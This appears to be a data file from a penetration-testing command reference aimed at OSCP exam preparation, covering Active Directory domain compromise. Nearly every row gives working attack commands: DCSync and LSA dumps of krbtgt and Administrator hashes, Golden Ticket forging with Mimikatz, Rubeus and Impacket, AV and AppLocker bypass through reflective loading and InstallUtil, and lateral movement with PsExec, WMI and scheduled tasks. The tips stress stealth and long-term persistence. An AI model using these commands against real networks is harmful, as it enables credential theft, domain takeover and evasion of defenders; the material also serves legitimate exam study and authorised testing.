useful in multi-domain forests or when current domain context is ambiguous. Example: /domain:corp.com"", ""Optional: /dc:<DC_FQDN>"": ""Target specific domain controller. Auto-detected by default (uses closest DC), but useful for targeting specific DCs or troubleshooting replication issues. Example: /dc:DC1.corp.com""}","[""ad-dcsync-check-domain-admins"", ""ad-dcsync-check-user-groups""]","[""ad-dcsync-secretsdump-user""]","[""windows-hashcat-crack-ntlm"", ""ad-pass-the-hash-crackmapexec"", ""ad-golden-ticket-dcsync-krbtgt""]"
"ad-dcsync-mimikatz-krbtgt","DCSync krbtgt for Golden Ticket","post-exploit","mimikatz # lsadump::dcsync /user:<DOMAIN>\krbtgt","Extract the krbtgt account hash - THE most critical credential in Active Directory. Used for creating Golden Tickets that grant domain-wide administrative access. krbtgt password rarely changes, providing long-term persistence.","active-directory","mimikatz # lsadump::dcsync /user:corp\krbtgt","ALWAYS extract krbtgt when you achieve Domain Admin access. This is your insurance policy - even if defenders change all passwords, the krbtgt hash remains valid (they rarely rotate it). OSCP EXAM TIP: After getting DA, immediately DCSync krbtgt and save the hash externally. If you lose access or session dies, you can create Golden Ticket for re-entry. The krbtgt account has TWO password hashes stored (current and previous) - use the 'Hash NTLM:' line (current hash). Time estimate: 10-30 seconds.

MANUAL ALTERNATIVES:
With explicit domain:
mimikatz # lsadump::dcsync /user:corp.com\krbtgt /domain:corp.com

Extract both NTLM and AES keys:
mimikatz # lsadump::dcsync /user:corp\krbtgt /csv

Impacket (Linux - RECOMMENDED):
impacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@192.168.50.70'

PowerShell:
Invoke-Mimikatz -Command '""lsadump::dcsync /user:corp\krbtgt""' | Out-File krbtgt.txt

Parse hash only:
mimikatz # lsadump::dcsync /user:corp\krbtgt | findstr ""Hash NTLM"" | Select-String -Pattern ""[a-f0-9]{32}""

TIME ESTIMATE: 10-30 seconds

NEXT STEP: Save this hash immediately! You need it + Domain SID + Domain FQDN for Golden Ticket:
1. Copy NTLM hash: [32 hex chars]
2. Get Domain SID: whoami /user (remove user RID)
3. Get Domain FQDN: echo %USERDNSDOMAIN%
4. Create Golden Ticket: kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-XXX /krbtgt:[HASH] /ptt","high","","","","{""Same as ad-dcsync-mimikatz-user"": ""See troubleshooting for ad-dcsync-mimikatz-user. krbtgt extraction has identical requirements and failure modes."", ""Account is disabled warning"": ""EXPECTED behavior. krbtgt is always disabled - it's not a login account. The hash is still valid for Golden Ticket creation. Ignore this warning.""}","{""lsadump::dcsync"": ""Same DCSync module as user extraction. The krbtgt account (RID 502) is special - it's a service account used by the Key Distribution Center (KDC) to encrypt and sign all Kerberos Ticket Granting Tickets (TGTs). Possessing this hash allows forging TGTs that the domain will trust indefinitely."", ""/user:krbtgt"": ""The Kerberos Ticket Granting Ticket account. This is a DISABLED built-in account (cannot be used for authentication directly). Its ONLY purpose is password hash storage for TGT encryption. CRITICAL: The krbtgt password is randomly generated at domain creation and ONLY changes during domain functional level upgrades (Server 2003 -> 2008+). In mature environments, this hash may be 10+ years old, providing extremely stable persistence."", ""Why krbtgt is critical"": ""With krbtgt hash, you can create Golden Tickets (forged TGTs) that grant Domain Admin rights to ANY user. These tickets are valid until krbtgt password changes (rare). The DC cannot revoke Golden Tickets because they're cryptographically valid. This is the ULTIMATE persistence mechanism in Active Directory.""}","[""ad-dcsync-check-domain-admins""]","[""ad-dcsync-secretsdump-user""]","[""ad-sid-whoami-extract"", ""ad-golden-ticket-purge-tickets"", ""ad-golden-ticket-mimikatz-create""]"
"ad-dcsync-mimikatz-administrator","DCSync Administrator Account","post-exploit","mimikatz # lsadump::dcsync /user:<DOMAIN>\Administrator","Extract the domain Administrator account hash (RID 500). High-value target for lateral movement and privilege escalation. Often has simple passwords in legacy environments.","active-directory","mimikatz # lsadump::dcsync /user:corp\Administrator","Administrator hash is useful for immediate lateral movement (Pass-the-Hash) or password cracking. Unlike krbtgt (service account), Administrator can authenticate directly via NTLM/Kerberos. OSCP TIP: If Administrator password is complex, use the hash directly with Pass-the-Hash (psexec.py, wmiexec.py, evil-winrm). Start Hashcat cracking in background while using PTH for time efficiency. The built-in Administrator account CANNOT be locked out, making it safe for password spraying if you don't have hash yet. Time estimate: 10-30 seconds.

MANUAL ALTERNATIVES:
DCSync with password history:
mimikatz # lsadump::dcsync /user:corp\Administrator /history

Find renamed Administrator:
Get-ADUser -Filter 'SID -like ""*-500""' | Select Name, SamAccountName

Impacket:
impacket-secretsdump -just-dc-user Administrator 'corp.com/admin:pass@192.168.50.70'

DCSync if renamed (example: AdminDA):
mimikatz # lsadump::dcsync /user:corp\AdminDA

Extract and crack immediately:
mimikatz # lsadump::dcsync /user:corp\Administrator | findstr ""Hash NTLM"" > admin_hash.txt
hashcat -m 1000 admin_hash.txt rockyou.txt -r best64.rule

TIME ESTIMATE: 10-30 seconds (extraction only), 1-60+ minutes (cracking, depends on password complexity)","high","","","","{""Object not found (Administrator renamed)"": ""The built-in Administrator account was renamed for security. Solution: Query by RID instead: Get-ADUser -Filter 'SID -like \""*-500\""'. Or enumerate: net user /domain | findstr /V \""$\"" (users without $ are not computer accounts). Once found, DCSync with: lsadump::dcsync /user:corp\\<RENAMED_ADMIN>"", ""Access Denied"": ""See troubleshooting for ad-dcsync-mimikatz-user.""}","{""lsadump::dcsync"": ""Same DCSync module. The built-in Administrator account (RID 500) is the default domain admin account created at domain setup. Unlike krbtgt (disabled service account), Administrator is an active user account that can be used for authentication."", ""/user:Administrator"": ""The built-in domain administrator account (SID S-1-5-21-<domain>-500). CANNOT be deleted or removed from Administrators group. Often renamed for security (query with RID 500 instead), but still usable. WHY target this: (1) Often has weak/default password, (2) Cannot be locked out (useful for password spraying), (3) Maximum privileges for lateral movement.""}","[""ad-dcsync-check-domain-admins""]","[""ad-dcsync-secretsdump-user"", ""ad-dcsync-mimikatz-user""]","[""windows-hashcat-crack-ntlm"", ""ad-pass-the-hash-crackmapexec""]"
"ad-golden-ticket-dcsync-krbtgt","Obtain krbtgt Hash via DCSync","enumeration","mimikatz # lsadump::dcsync /domain:<DOMAIN_FQDN> /user:krbtgt","Extract krbtgt account NTLM hash remotely using DCSync attack. Requires Domain Admin or equivalent replication privileges. This is the PRIMARY method for obtaining krbtgt hash without accessing the Domain Controller directly.","active-directory","mimikatz # lsadump::dcsync /domain:corp.com /user:krbtgt","DCSync is the PREFERRED method for obtaining krbtgt hash because it can be performed remotely without logging into the Domain Controller. This reduces detection risk and operational footprint. The attack leverages legitimate AD replication protocols, making it difficult to distinguish from normal DC-to-DC synchronization traffic. Time estimate: 10-30 seconds for hash extraction. Save the NTLM hash immediately - you'll need it for Golden Ticket creation.

MANUAL ALTERNATIVES:
Without Mimikatz, you can use Impacket's secretsdump.py: secretsdump.py <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> -just-dc-user krbtgt

Or PowerShell with Invoke-Mimikatz: Invoke-Mimikatz -Command '""lsadump::dcsync /domain:<DOMAIN> /user:krbtgt""'

TIME ESTIMATE: 30 seconds - 1 minute (including verification)","high","","","","{""ERROR 0x00002105 (Access Denied)"": ""Current user lacks replication privileges. Required extended rights: DS-Replication-Get-Changes and DS-Replication-Get-Changes-All. Solution: Compromise a Domain Admin, Enterprise Admin, or Domain Controller account. Verify group membership with: net user <username> /domain"", ""RPC server unavailable"": ""Cannot contact Domain Controller. Solution: Verify DC hostname resolution (nslookup <domain>), ensure network connectivity (ping <dc_fqdn>), check firewall rules (RPC requires ports 135, 445, and dynamic high ports)."", ""The user name or password is incorrect"": ""Current session lacks domain authentication. Solution: Ensure you're running from a domain-joined machine or have injected domain credentials (runas /netonly, or pass-the-hash attack)."", ""No output / blank hash field"": ""krbtgt account may be disabled (rare). Solution: Verify account status with: net user krbtgt /domain. If disabled, this is an exceptional configuration requiring further investigation.""}","{""lsadump::dcsync"": ""Mimikatz module that simulates the behavior of a Domain Controller by requesting account password data via the Directory Replication Service (DRS) Remote Protocol. This allows extraction of password hashes WITHOUT executing code on the Domain Controller itself. Requires DS-Replication-Get-Changes and DS-Replication-Get-Changes-All extended rights (granted to Domain Admins, Enterprise Admins, and Domain Controllers by default)."", ""/domain"": ""Target domain's Fully Qualified Domain Name (FQDN). Example: corp.com, internal.local, ad.example.com. CRITICAL: Use the FQDN format, not NetBIOS name. The DCSync protocol requires proper domain specification for replication requests."", ""/user:krbtgt"": ""Target account to extract. The 'krbtgt' (Kerberos Ticket Granting Ticket) account is a special built-in account used by the Key Distribution Center (KDC) service. Its password hash is used to encrypt all TGTs issued by the domain. This account's password is ONLY changed during domain functional level upgrades from pre-Windows Server 2008, making it extremely stable for persistence.""}","[""ad-dcsync-check-privileges""]","[""ad-golden-ticket-lsa-dump-krbtgt""]","[""ad-sid-whoami-extract"", ""ad-golden-ticket-purge-tickets"", ""ad-golden-ticket-mimikatz-create""]"
"ad-golden-ticket-lsa-dump-krbtgt","Obtain krbtgt Hash via LSA Dump (On DC)","enumeration","mimikatz # lsadump::lsa /patch","Extract krbtgt account NTLM hash directly from Domain Controller's LSA (Local Security Authority) memory. Requires local administrator access ON the Domain Controller. Alternative to DCSync when you have direct DC access.","active-directory","","LSA dump requires PHYSICAL (or RDP) access to the Domain Controller, making it less stealthy than DCSync. However, it's useful when: (1) You've already compromised the DC, (2) Replication rights are unavailable, (3) DCSync is being monitored. IMPORTANT: This method dumps ALL domain account hashes, not just krbtgt. Save the output to a file for later analysis. The krbtgt hash is marked with RID 000001f6 (502 in decimal). Time estimate: 10-20 seconds for dump completion.

MANUAL ALTERNATIVES:
Without Mimikatz on the DC, you can:
1. Use Impacket remotely: secretsdump.py <DOMAIN>/<USER>@<DC_IP> -just-dc
2. Extract NTDS.dit and SYSTEM hive, then parse offline: ntdsutil 'activate instance ntds' 'ifm' 'create full C:\temp\ntds' quit quit
3. Use built-in tools: reg save HKLM\SYSTEM SystemBkup.hiv && reg save HKLM\SAM SAMBkup.hiv

TIME ESTIMATE: 30 seconds - 1 minute (including privilege escalation to SYSTEM)","medium","","","","{""Handle on memory (0x00000000)"": ""Failed to access LSASS memory. Solution: Run 'privilege::debug' first to obtain SeDebugPrivilege. If still failing, ensure Mimikatz is running as Administrator (not just elevated - use PsExec -s for SYSTEM context)."", ""ERROR 0x00000002"": ""LSA data retrieval failed. Solution: The /patch parameter may have failed to apply. Verify Windows Defender / AV is disabled. On highly restricted systems, try alternative: 'lsadump::lsa /inject' to inject into a new process."", ""Mimikatz requires Local System privileges"": ""Running as Administrator but not SYSTEM. Solution: Use PsExec to launch Mimikatz as SYSTEM: PsExec.exe -s -i cmd.exe, then run Mimikatz from that shell."", ""Access is denied"": ""Insufficient privileges. Solution: Verify you're local admin on the DC: net localgroup Administrators. If not, compromise a DC admin account first.""}","{""lsadump::lsa"": ""Mimikatz module that dumps the Local Security Authority (LSA) secrets from memory. LSA stores sensitive security information including cached domain credentials, service account passwords, and the krbtgt hash. This method requires running Mimikatz ON the Domain Controller itself with local admin privileges."", ""/patch"": ""Patches LSASS.exe memory to bypass security protections that prevent credential dumping. This temporarily modifies the LSASS process in-memory to disable safeguards. CRITICAL: Use 'privilege::debug' first to obtain SeDebugPrivilege, which is required for LSASS memory access. The /patch flag is necessary on modern Windows Server versions (2012+) due to enhanced LSA protections.""}","[""windows-psexec-system-shell""]","[""ad-golden-ticket-dcsync-krbtgt""]","[""ad-sid-whoami-extract"", ""ad-golden-ticket-purge-tickets"", ""ad-golden-ticket-mimikatz-create""]"
"ad-golden-ticket-purge-tickets","Purge Existing Kerberos Tickets","post-exploit","mimikatz # kerberos::purge","Delete all Kerberos tickets from the current user session. Essential cleanup before injecting a Golden Ticket to avoid conflicts with existing tickets. Ensures the forged ticket will be used for authentication.","active-directory","","Ticket purging is OPTIONAL but highly recommended for clean Golden Ticket injection. If you don't purge, Windows may use cached legitimate tickets instead of your forged Golden Ticket, causing authentication to fail or use the wrong identity. Best practice: Always purge before injecting any forged ticket (Golden or Silver). This operation is reversible - simply re-authenticate to domain resources to generate new legitimate tickets. Time estimate: Instant (<1 second).

MANUAL ALTERNATIVES:
Native Windows command (requires elevation):
klist purge

PowerShell alternative:
Invoke-Mimikatz -Command '""kerberos::purge""'

Complete cleanup (close sessions + purge):
net use * /delete /y && klist purge

TIME ESTIMATE: < 5 seconds","high","","","","{""Access is denied"": ""Insufficient privileges for ticket cache manipulation. Solution: This should work for standard users on their own session. If failing, try running Mimikatz as Administrator. Verify you're purging YOUR session, not another user's."", ""ERROR kuhl_m_kerberos_purge"": ""Kerberos subsystem error. Solution: Verify Windows is domain-joined (not workgroup). Check domain connectivity: nltest /dsgetdc:<domain>. If domain unreachable, ticket purge may fail."", ""No effect / tickets remain"": ""Tickets being regenerated immediately. Solution: This is normal if you're actively authenticated to domain resources. Close all SMB connections (net use * /delete) and try again. Alternatively, proceed with Golden Ticket injection - it will override existing tickets.""}","{""kerberos::purge"": ""Mimikatz module that removes all Kerberos tickets from the current logon session's ticket cache. Equivalent to 'klist purge' but works even when klist fails. This clears both TGTs (Ticket Granting Tickets) and TGS tickets (service tickets). CRITICAL: Purge tickets BEFORE creating a Golden Ticket to ensure Windows uses the forged ticket instead of cached legitimate tickets. The purge only affects the current session - other logged-in users retain their tickets.""}","","[""kerberos-klist-purge""]","[""ad-golden-ticket-mimikatz-create"", ""ad-golden-ticket-verify-klist""]"
"ad-golden-ticket-mimikatz-create","Create Golden Ticket with Mimikatz","post-exploit","mimikatz # kerberos::golden /user:<USERNAME> /domain:<DOMAIN_FQDN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NTLM> /ptt","Forge a Kerberos Ticket Granting Ticket (TGT) using the krbtgt account hash and inject it into memory. This creates a domain-administrative ticket granting domain-wide access. The PRIMARY method for Golden Ticket attacks.","active-directory","mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt","Golden Ticket is one of the most powerful Active Directory persistence techniques. Key advantages: (1) Domain-wide access to all resources, (2) krbtgt password rarely changes (only on domain functional level upgrades), (3) Works from non-domain-joined machines, (4) No administrative privileges needed for ticket creation (only for obtaining krbtgt hash initially). EXAM TIP: Always use hostnames (not IPs) when authenticating with Golden Tickets - Kerberos requires FQDNs. Default ticket lifetime is 10 years - extremely suspicious for detection. Consider customizing with /startoffset, /endin, /renewmax flags for realistic lifetimes. Time estimate: 5-10 seconds for ticket creation and injection.

MANUAL ALTERNATIVES:
Rubeus alternative (C# implementation):
Rubeus.exe golden /user:<USERNAME> /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<HASH> /ptt

Impacket alternative (Linux):
ticketer.py -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> <USERNAME>
export KRB5CCNAME=<USERNAME>.ccache
psexec.py <DOMAIN>/<USERNAME>@<TARGET> -k -no-pass

PowerShell (Invoke-Mimikatz):
Invoke-Mimikatz -Command '""kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /krbtgt:<HASH> /ptt""'

TIME ESTIMATE: 10-15 seconds (creation + injection)","high","","","","{""SID is too long"": ""You included the user RID in the /sid parameter. Solution: Remove the last segment from the SID. Example: Change 'S-1-5-21-XXX-XXX-XXX-1105' to 'S-1-5-21-XXX-XXX-XXX'. The /sid parameter requires DOMAIN SID only, not user SID."", ""Data length error"": ""Incorrect hash format for /krbtgt parameter. Solution: Verify the hash is exactly 32 hexadecimal characters (0-9, a-f). Remove any spaces, colons, or prefixes. Example: '1693c6cefafffc7af11ef34d1c788f47' (correct) vs '16:93:c6:ce...' (incorrect)."", ""KRB_AP_ERR_MODIFIED (when using ticket)"": ""Incorrect krbtgt hash or Domain SID. Solution: Re-extract krbtgt hash with DCSync. Verify Domain SID with: whoami /user (from any domain user). Common mistake: Using computer SID instead of domain SID. Ensure you're using hash from the correct domain."", ""User does not exist (post-July 2022)"": ""Specified /user account doesn't exist in Active Directory. Solution: Use an existing account name. Query accounts with: net user /domain. Use common accounts like service accounts or known user accounts from reconnaissance."", ""Ticket created but authentication fails"": ""Using IP address instead of hostname for target. Solution: Golden Tickets use Kerberos authentication which requires FQDNs. Use: PsExec.exe \\\\DC1 cmd.exe (correct) instead of PsExec.exe \\\\192.168.50.70 cmd.exe (forces NTLM). Verify DNS resolution: nslookup <target_fqdn>.""}","{""kerberos::golden"": ""Mimikatz module for forging Kerberos tickets (both TGTs and TGS). When used with /krbtgt parameter, it creates a Golden Ticket (TGT). The forged ticket is encrypted with the krbtgt password hash, making it indistinguishable from legitimate TGTs issued by the KDC. Windows systems trust this ticket because it has valid encryption."", ""/user"": ""Account name to impersonate in the forged ticket. CRITICAL: As of July 2022 Microsoft security updates, this MUST be an existing domain account. Prior to this update, fictional usernames worked. Use a real low-privileged account (e.g., 'jen', 'bob') - the ticket's group memberships grant Domain Admin rights regardless of the real account's privileges. WHY: This provides stealth - using 'Administrator' is obvious, using 'jen' with DA rights is subtle."", ""/domain"": ""Target domain's Fully Qualified Domain Name (FQDN). Example: corp.com, internal.local. MUST match the domain of the krbtgt hash. The forged ticket's realm field will be set to this value. Windows validates that the ticket realm matches the domain during authentication. WHY FQDN: Kerberos uses realm names (FQDNs), not NetBIOS names."", ""/sid"": ""Domain Security Identifier WITHOUT the RID (Relative Identifier). Format: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX. CRITICAL: Exclude the user RID (the last segment after the final hyphen). Example: if 'whoami /user' shows 'S-1-5-21-1987370270-658905905-1781884369-1105', use only 'S-1-5-21-1987370270-658905905-1781884369'. WHY: The /user parameter adds the user RID automatically. The /sid parameter is the DOMAIN SID, not a user SID."", ""/krbtgt"": ""NTLM password hash of the krbtgt account (32 hex characters). This is the secret key used to encrypt TGTs. By possessing this hash, we can forge TGTs that the domain controller will trust and decrypt. The KDC has no way to distinguish our forged TGT from a legitimate one because the encryption is valid. CRITICAL: This is the most sensitive credential in Active Directory - protect it carefully."", ""/ptt"": ""Pass The Ticket - automatically inject the forged ticket into the current session's Kerberos ticket cache after creation. Without this flag, the ticket is only created but not used. WITH /ptt: Ticket is immediately usable for authentication. Alternative: Use /ticket parameter to save to file, then 'kerberos::ptt <file>' to inject later. WHY /ptt: Streamlines the attack - create and use in one command."", ""Default: /id:500"": ""Mimikatz automatically sets the forged user's RID to 500 (built-in Administrator). This doesn't change the /user value shown in the ticket, but affects internal ticket structure. WHY 500: Ensures maximum compatibility and privileges."", ""Default: /groups:513,512,520,518,519"": ""Mimikatz automatically adds the user to the most privileged groups: 512 (Domain Admins), 513 (Domain Users), 518 (Schema Admins), 519 (Enterprise Admins), 520 (Group Policy Creator Owners). These group memberships grant domain-wide administrative access. The domain controller trusts these group claims because the ticket encryption is valid.""}","[""ad-golden-ticket-dcsync-krbtgt"", ""ad-sid-whoami-extract"", ""ad-golden-ticket-purge-tickets""]","[""ad-golden-ticket-rubeus-create""]","[""ad-golden-ticket-verify-klist"", ""ad-golden-ticket-psexec-use"", ""windows-net-use-smb-connect""]"
"ad-golden-ticket-rubeus-create","Create Golden Ticket with Rubeus (Alternative)","post-exploit","Rubeus.exe golden /user:<USERNAME> /domain:<DOMAIN_FQDN> /sid:<DOMAIN_SID> /rc4:<KRBTGT_NTLM> /ptt","Forge a Kerberos TGT using Rubeus (C# alternative to Mimikatz). Provides AES encryption option for better evasion. Useful when Mimikatz is detected by AV/EDR.","active-directory","Rubeus.exe golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /rc4:1693c6cefafffc7af11ef34d1c788f47 /ptt","Rubeus is a modern alternative to Mimikatz with better AV/EDR evasion. Advantages: (1) Pure C#, doesn't interact with LSASS directly, (2) Can use AES256 encryption for stealthier tickets, (3) Compiles to .NET assembly (execute-assembly in Cobalt Strike), (4) Active development and updates. Disadvantages: (1) Requires .NET Framework on target, (2) Less feature-complete than Mimikatz for other attacks. EXAM TIP: If Mimikatz is blocked by AV, try Rubeus. For maximum stealth, use /aes256 if you can obtain the AES krbtgt key. Time estimate: 10-20 seconds.

MANUAL ALTERNATIVES:
AES256 encryption (stealthier):
Rubeus.exe golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /aes256:<AES_KEY> /ptt

Save to file instead of injecting:
Rubeus.exe golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /rc4:<HASH> /outfile:ticket.kirbi
Rubeus.exe ptt /ticket:ticket.kirbi

Reflective loading (bypass AV):
[System.Reflection.Assembly]::Load([IO.File]::ReadAllBytes('Rubeus.exe'))
[Rubeus.Program]::Main('golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /rc4:<HASH> /ptt'.Split())

TIME ESTIMATE: 15-30 seconds (including AV bypass if needed)","medium","","","","{""Invalid domain SID"": ""Included user RID in /sid parameter. Solution: Remove last segment from SID (same as Mimikatz troubleshooting)."", ""Invalid hash format"": ""Incorrect hash length or characters. Solution: Ensure exactly 32 hex characters for RC4, or 64 hex characters for AES256."", ""Unable to import ticket"": ""Insufficient privileges for ticket cache manipulation. Solution: Run Rubeus as Administrator. Alternatively, save ticket to file (/outfile:ticket.kirbi) and inject later when privileges are available."", ""Rubeus.exe not recognized"": ""Rubeus not in PATH or current directory. Solution: Download from GitHub (GhostPack/Rubeus), compile with Visual Studio, or use pre-compiled release. Transfer to target with file transfer techniques."", ""This program is blocked by group policy"": ""Application whitelisting / AppLocker blocking Rubeus.exe. Solution: Try InstallUtil.exe bypass (InstallUtil /logfile= /LogToConsole=false /U Rubeus.exe), or use PowerShell reflective loading: $data = [IO.File]::ReadAllBytes('Rubeus.exe'); [Reflection.Assembly]::Load($data)""}","{""golden"": ""Rubeus command for Golden Ticket creation. Rubeus is a C# toolset for Kerberos abuse, compiled as a .NET assembly. Advantage over Mimikatz: Pure C#, doesn't touch LSASS, better AV/EDR evasion, can be loaded reflectively via PowerShell or Cobalt Strike's execute-assembly."", ""/user"": ""Account name to impersonate. Same requirements as Mimikatz - must be existing account (post-July 2022). Rubeus will forge the PAC (Privilege Attribute Certificate) with Domain Admin group memberships automatically."", ""/domain"": ""Target domain FQDN. Rubeus uses this to construct the Kerberos realm and SPN (Service Principal Name) for the krbtgt service."", ""/sid"": ""Domain SID without user RID. Same format as Mimikatz. Rubeus uses this to construct group SIDs (e.g., S-1-5-21-XXX-512 for Domain Admins)."", ""/rc4"": ""NTLM hash of krbtgt account. In Rubeus, RC4 encryption is specified with /rc4 flag (unlike Mimikatz which uses /krbtgt). WHY RC4: Fastest encryption, widest compatibility. Tradeoff: RC4 is deprecated and monitored by modern SOCs. For evasion, use /aes256 instead (requires AES krbtgt key)."", ""/ptt"": ""Pass The Ticket - inject into current session after creation. Identical behavior to Mimikatz. Without this flag, ticket is saved to .kirbi file for later use."", ""Alternative: /aes256:<AES_KEY>"": ""Use AES256 encryption instead of RC4. Requires AES256 krbtgt key (obtain with: lsadump::dcsync /domain:<DOMAIN> /user:krbtgt). BENEFIT: AES256 is the modern encryption standard, less suspicious than RC4. Many SOC rules alert on RC4 ticket usage. EXAM NOTE: AES keys may not be available in older lab environments.""}","[""ad-golden-ticket-dcsync-krbtgt"", ""ad-sid-whoami-extract""]","[""ad-golden-ticket-mimikatz-create""]","[""ad-golden-ticket-verify-klist"", ""ad-golden-ticket-psexec-use""]"
"ad-golden-ticket-verify-klist","Verify Golden Ticket with klist","enumeration","klist","Display all Kerberos tickets in the current user session to verify Golden Ticket injection. Shows ticket details including client, server, encryption type, and expiration.","active-directory","","ALWAYS verify ticket injection with klist before attempting lateral movement. This confirms: (1) Ticket was successfully created and injected, (2) Correct domain and realm, (3) Valid encryption and ticket flags, (4) Ticket hasn't expired. Key indicators of Golden Ticket: (1) Server: krbtgt/<domain> (it's a TGT, not service ticket), (2) Extremely long validity period (default 10 years), (3) Client name matches your /user parameter. EXAM TIP: If klist shows no tickets but Mimikatz said 'successfully submitted', you may need to open a new command prompt with 'mimikatz # misc::cmd' to inherit the ticket. Time estimate: Instant (<1 second).

MANUAL ALTERNATIVES:
Mimikatz alternative:
mimikatz # kerberos::list

Rubeus alternative:
Rubeus.exe klist

PowerShell (requires admin):
Get-WinEvent -LogName Security -FilterXPath ""*[System[EventID=4768]]"" | Select TimeCreated, Message

Detailed ticket analysis:
klist -li 0x3e7 (SYSTEM session)
klist sessions (all sessions, requires admin)

TIME ESTIMATE: < 5 seconds","high","","","","{""No credentials cached"": ""No tickets present. Solution: Golden Ticket injection failed or was purged. Re-run 'kerberos::golden /ptt' with correct parameters. Verify Mimikatz didn't show errors during injection."", ""Current LogonId is 0:0x0"": ""Not in a valid logon session. Solution: Ensure you're running in an interactive user session (not SYSTEM context). Open a new command prompt with: mimikatz # misc::cmd after ticket injection."", ""Server: krbtgt/<domain> missing"": ""Only service tickets (TGS) shown, no TGT. Solution: A Golden Ticket IS a TGT, so it should show 'Server: krbtgt/<domain>'. If missing, ticket injection failed. Check ticket creation output for errors."", ""Encryption Type: NULL"": ""Ticket is corrupted or invalid. Solution: Purge tickets (klist purge) and recreate Golden Ticket with correct krbtgt hash and domain SID."", ""Ticket expiration shows already expired"": ""System clock is incorrect, or ticket was created with past dates. Solution: Verify system time (time /t), sync with DC if needed (w32tm /resync). Recreate ticket without custom time parameters.""}","{""klist"": ""Native Windows command (part of Windows since Server 2008) that displays cached Kerberos tickets for the current logon session. Shows TGTs (Ticket Granting Tickets) and TGS tickets (service tickets). NO FLAGS REQUIRED for basic listing. Useful for verifying ticket injection success, checking ticket lifetimes, and troubleshooting Kerberos authentication issues."", ""Optional: klist tickets"": ""Same as 'klist' without arguments - displays tickets for current session."", ""Optional: klist purge"": ""Deletes all tickets from current session (equivalent to mimikatz kerberos::purge)."", ""Optional: klist sessions"": ""Lists all logon sessions on the system (requires admin privileges). Useful for seeing all users' tickets.""}","[""ad-golden-ticket-mimikatz-create""]","","[""ad-golden-ticket-psexec-use"", ""windows-net-use-smb-connect""]"
"ad-golden-ticket-psexec-use","Use Golden Ticket for Lateral Movement (PsExec)","exploitation","PsExec.exe \\<TARGET_FQDN> cmd.exe","Leverage Golden Ticket for lateral movement to remote systems using PsExec. The forged TGT provides domain-wide administrative access, allowing command execution on any domain system.","active-directory","PsExec.exe \\DC1 cmd.exe","This is the PAYOFF of the Golden Ticket attack - domain-wide administrative access. The forged TGT grants permissions to ANY system in the domain. You're not limited to PsExec - ANY Kerberos-aware tool will work: WMI (wmic), WinRM (Enter-PSSession), RDP (mstsc), SMB file access (dir \\DC1\C$). CRITICAL EXAM TIP: ALWAYS use hostnames/FQDNs with Golden Tickets. Using IP addresses forces NTLM authentication and bypasses your forged Kerberos ticket, causing 'Access Denied'. This is the #1 mistake when using Golden Tickets. Time estimate: 5-10 seconds for PsExec connection establishment.

MANUAL ALTERNATIVES:
Alternative lateral movement methods with Golden Ticket:

1. WMI:
wmic /node:<TARGET_FQDN> process call create ""cmd.exe /c <command>""

2. WinRM (PowerShell):
Enter-PSSession -ComputerName <TARGET_FQDN>

3. Direct SMB access:
dir \\<TARGET_FQDN>\C$
copy file.txt \\<TARGET_FQDN>\C$\Temp\

4. RDP:
mstsc /v:<TARGET_FQDN>

5. Impacket (Linux):
export KRB5CCNAME=ticket.ccache
psexec.py <DOMAIN>/<USER>@<TARGET_FQDN> -k -no-pass

6. Scheduled task:
schtasks /create /tn ""Update"" /tr ""cmd.exe /c <command>"" /sc once /st 00:00 /S <TARGET_FQDN>

TIME ESTIMATE: 10-20 seconds (connection + authentication)","high","","","","{""Access is denied"": ""Golden Ticket not injected, expired, or you're using IP address instead of hostname. Solution: (1) Verify ticket with klist - ensure 'Server: krbtgt/<domain>' is present. (2) Use hostname/FQDN, not IP: PsExec.exe \\\\DC1 cmd.exe (correct) vs PsExec.exe \\\\192.168.50.70 cmd.exe (incorrect - forces NTLM). (3) Recreate ticket if expired."", ""The network path was not found"": ""DNS resolution failure or target is offline. Solution: Verify target hostname resolves: nslookup <TARGET_FQDN>. Verify target is reachable: ping <TARGET_FQDN>. Check spelling of hostname. If DNS fails, add to hosts file: echo <IP> <FQDN> >> C:\\Windows\\System32\\drivers\\etc\\hosts"", ""The user name or password is incorrect"": ""Ticket is invalid or corrupted. Solution: Verify krbtgt hash and domain SID are correct. Common mistake: Using wrong domain's krbtgt hash. Purge tickets (klist purge) and recreate Golden Ticket with verified parameters."", ""No logon servers available"": ""Domain controller unreachable. Solution: Verify DC connectivity: nltest /dsgetdc:<domain>. Check network path to DC: ping <DC_FQDN>. If DC is down, Kerberos authentication fails. Verify firewall rules allow Kerberos (TCP/UDP 88)."", ""PsExec is not recognized"": ""PsExec not in PATH. Solution: Download Sysinternals Suite, extract PsExec64.exe. Use full path: C:\\Tools\\SysinternalsSuite\\PsExec64.exe \\\\<TARGET> cmd.exe. Alternative: Copy PsExec to current directory."", ""Couldn't access <target> (using hostname, ticket valid)"": ""Firewall blocking SMB (TCP 445). Solution: Verify SMB connectivity: Test-NetConnection <TARGET> -Port 445 (PowerShell). If blocked, try alternative lateral movement: WMI (wmic), WinRM (Enter-PSSession), RDP (mstsc).""}","{""PsExec.exe"": ""Sysinternals tool for executing commands on remote Windows systems via SMB. When provided with a FQDN/hostname, PsExec uses Kerberos authentication. It will automatically use any cached Kerberos tickets (like our Golden Ticket) for authentication. CRITICAL: Use hostname/FQDN (\\\\DC1), not IP (\\\\192.168.50.70). IPs force NTLM authentication which bypasses Kerberos."", ""\\\\<TARGET_FQDN>"": ""UNC path to target system using hostname. Format: \\\\HOSTNAME or \\\\HOSTNAME.DOMAIN.COM. Windows networking automatically selects Kerberos when FQDN is used. WHY: Kerberos requires Service Principal Names (SPNs) which are based on hostnames, not IPs. Using IP forces fallback to NTLM authentication."", 